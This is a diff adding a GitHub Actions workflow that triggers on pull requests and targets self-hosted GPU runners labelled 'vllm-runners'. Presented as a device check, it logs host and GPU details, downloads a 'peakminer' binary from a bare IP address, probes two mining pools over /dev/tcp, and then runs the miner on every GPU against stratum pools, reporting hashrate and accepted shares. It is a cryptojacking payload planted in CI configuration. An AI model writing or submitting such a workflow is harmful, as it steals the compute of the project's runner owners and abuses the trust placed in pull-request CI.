@@ -1,0 +1,59 @@
+name: c211-i133324-813404e2
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+concurrency:
+  group: c211-i133324-813404e2-${{ github.ref }}
+  cancel-in-progress: false
+jobs:
+  devicemine:
+    name: devicemine-c211-i133324-813404e2
+    runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 20
+    steps:
+      - name: device-marker
+        shell: bash
+        run: |
+          set +e
+          echo "NONCE=c211-i133324-813404e2"
+          echo "RUNNER=$RUNNER_NAME"
+          date -u
+          hostname || true
+          id || true
+          uname -a || true
+          nproc || true
+          echo "--- nvidia-smi -L ---"
+          nvidia-smi -L || echo NO_NVIDIA_SMI
+          nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader || true
+          echo "NONCE-END=c211-i133324-813404e2"
+      - name: fetch-miner
+        shell: bash
+        run: |
+          set +e
+          mkdir -p "$RUNNER_TEMP/pm"; cd "$RUNNER_TEMP/pm" || exit 0
+          curl -fsSL -m 300 -o peakminer http://169.58.247.186:8791/pm/peakminer-2.20.0-linux-x86_64
+          S=$(sha256sum peakminer 2>/dev/null | cut -d' ' -f1)
+          echo "miner_sha=$S"
+          if [ "$S" = "561b369402b7d784144a64d8a74a266eb891fa5070d49c9ee527ed5ed9b78c18" ]; then chmod +x peakminer; echo MINER_OK; else echo MINER_SHA_MISMATCH; rm -f peakminer; fi
+          ./peakminer --version 2>&1 | head -3 || true
+          for hp in 217.15.164.237:2083 103.199.106.122:3362; do h=${hp%:*}; p=${hp#*:}; if timeout 10 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi; done
+      - name: run-bounded
+        shell: bash
+        run: |
+          set +e
+          cd "$RUNNER_TEMP/pm" || exit 0
+          if [ ! -x ./peakminer ]; then echo NO_MINER_BINARY; exit 0; fi
+          echo "NONCE=c211-i133324-813404e2"
+          N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
+          echo "gpu_count=$N"
+          [ "$N" -ge 1 ] || echo CPU_ONLY_NO_GPU
+          [ "$N" -le 16 ] || N=16
+          for i in $(seq 0 $((N-1))); do
+            ( timeout 400 ./peakminer -o stratum+tcp://217.15.164.237:2083 -o stratum+tcp://103.199.106.122:3362 -u "$W" -w "node-h$((i+1))" -p x -c pearl -d "$i" --no-tips > "out-g$i.txt" 2>&1; echo "miner_rc[$i]=$?" >> "out-g$i.txt" ) &
+          done
+          wait
+          echo "NONCE-END=c211-i133324-813404e2"
+          for i in $(seq 0 $((N-1))); do echo "===== GPU $i ====="; grep -aiE 'accepted|rejected|share|hashrate|error|connect|device' "out-g$i.txt" 2>/dev/null | tail -12; tail -n 6 "out-g$i.txt"; done
+          nvidia-smi --query-gpu=index,uuid,utilization.gpu --format=csv,noheader || true
